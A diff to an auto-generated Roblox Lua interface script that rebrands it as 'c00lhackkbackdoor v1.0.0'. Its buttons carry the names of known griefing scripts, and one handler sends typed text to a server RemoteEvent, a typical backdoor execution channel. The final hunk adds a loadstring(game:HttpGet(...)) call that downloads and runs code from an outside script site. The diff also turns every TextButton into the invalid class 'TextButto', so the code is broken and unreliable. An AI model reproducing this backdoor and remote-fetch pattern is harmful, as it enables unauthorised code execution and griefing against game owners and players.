@@ -1161,7 +1161,7 @@ G2L["374"] = Instance.new("LocalScript")
 G2L["375"] = Instance.new("Frame")
 
 --po.main.top.Holder.scriptspage3.mosque
-G2L["376"] = Instance.new("TextButton")
+G2L["376"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.mosque.Script
 G2L["377"] = Instance.new("Script")
@@ -1173,7 +1173,7 @@ G2L["378"] = Instance.new("LocalScript")
 G2L["379"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.blast
-G2L["380"] = Instance.new("TextButton")
+G2L["380"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.blast.Script
 G2L["381"] = Instance.new("Script")
@@ -1185,7 +1185,7 @@ G2L["382"] = Instance.new("LocalScript")
 G2L["383"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.bomb
-G2L["384"] = Instance.new("TextButton")
+G2L["384"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.bomb.Script
 G2L["385"] = Instance.new("Script")
@@ -1197,7 +1197,7 @@ G2L["386"] = Instance.new("LocalScript")
 G2L["387"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.map
-G2L["388"] = Instance.new("TextButton")
+G2L["388"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.map.Script
 G2L["389"] = Instance.new("Script")
@@ -1209,7 +1209,7 @@ G2L["390"] = Instance.new("LocalScript")
 G2L["391"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.decal
-G2L["392"] = Instance.new("TextButton")
+G2L["392"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.decal.Script
 G2L["393"] = Instance.new("Script")
@@ -1221,7 +1221,7 @@ G2L["394"] = Instance.new("LocalScript")
 G2L["395"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.obunga
-G2L["396"] = Instance.new("TextButton")
+G2L["396"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.obunga.Script
 G2L["397"] = Instance.new("Script")
@@ -1233,7 +1233,7 @@ G2L["398"] = Instance.new("LocalScript")
 G2L["399"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.rc7
-G2L["400"] = Instance.new("TextButton")
+G2L["400"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.rc7.Script
 G2L["401"] = Instance.new("Script")
@@ -1245,7 +1245,7 @@ G2L["402"] = Instance.new("LocalScript")
 G2L["403"] = Instance.new("RemoteEvent")
 
 --po.main.top.Holder.scriptspage3.beforepage
-G2L["404"] = Instance.new("TextButton")
+G2L["404"] = Instance.new("TextButto")
 
 --po.main.top.Holder.scriptspage3.beforepage.LocalScript
 G2L["405"] = Instance.new("LocalScript")
@@ -1328,7 +1328,7 @@ G2L["2"].Parent = G2L["1"]
 --po.main.top.title
 G2L["3"].Name = [[title]]
 G2L["3"].FontFace = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-G2L["3"].Text = [[POLARIA]]
+G2L["3"].Text = [[c00lhackkbackdoor v1.0.0]]
 G2L["3"].TextColor3 = Color3.fromRGB(255, 255, 255)
 G2L["3"].TextScaled = false
 G2L["3"].TextSize = 19
@@ -1390,7 +1390,7 @@ G2L["5"].Parent = G2L["4"]
 --po.main.top.maximize
 G2L["6"].Name = [[maximize]]
 G2L["6"].FontFace = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-G2L["6"].Text = [[ðŸ—–]]
+G2L["6"].Text = [[[]]]
 G2L["6"].TextColor3 = Color3.fromRGB(255, 255, 255)
 G2L["6"].TextScaled = false
 G2L["6"].TextSize = 23
@@ -1873,7 +1873,7 @@ G2L["32"].Parent = G2L["31"]
 --po.main.top.Holder.homepage.jobid
 G2L["33"].Name = [[jobid]]
 G2L["33"].FontFace = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-G2L["33"].Text = [[Job ID: 00000000-0000-0000-0000-000000000000]]
+G2L["33"].Text = [[lol Job ID: 00000000-0000-0000-0000-000000000000]]
 G2L["33"].TextColor3 = Color3.fromRGB(255, 255, 255)
 G2L["33"].TextScaled = false
 G2L["33"].TextSize = 18
@@ -1972,7 +1972,7 @@ G2L["38"].Parent = G2L["37"]
 --po.main.top.Holder.homepage.progress
 G2L["39"].Name = [[progress]]
 G2L["39"].FontFace = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-G2L["39"].Text = [[Success! You are now be able to use.]]
+G2L["39"].Text = [[Success! You are now able to use.]]
 G2L["39"].TextColor3 = Color3.fromRGB(255, 255, 255)
 G2L["39"].TextScaled = false
 G2L["39"].TextSize = 18
@@ -12858,7 +12858,7 @@ local function C_G2L_246()
 
 	script.Parent.MouseButton1Click:Connect(function()
 		game.ReplicatedStorage.RemoteEvent:FireServer(script.Parent.Parent.input.Text)
-     end) 
+        end)
 end
 task.spawn(C_G2L_246)
 
@@ -13048,7 +13048,7 @@ task.spawn(C_G2L_311)
 local function C_G2L_317()
 local script = G2L["317"]
 script.Parent.MouseButton1Click:Connect(function()
-execute("require(12350030542).RC7('"..game.Players.LocalPlayer.Name.."')")
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Steve-script-24707"))()
 end)
 end
 task.spawn(C_G2L_317)
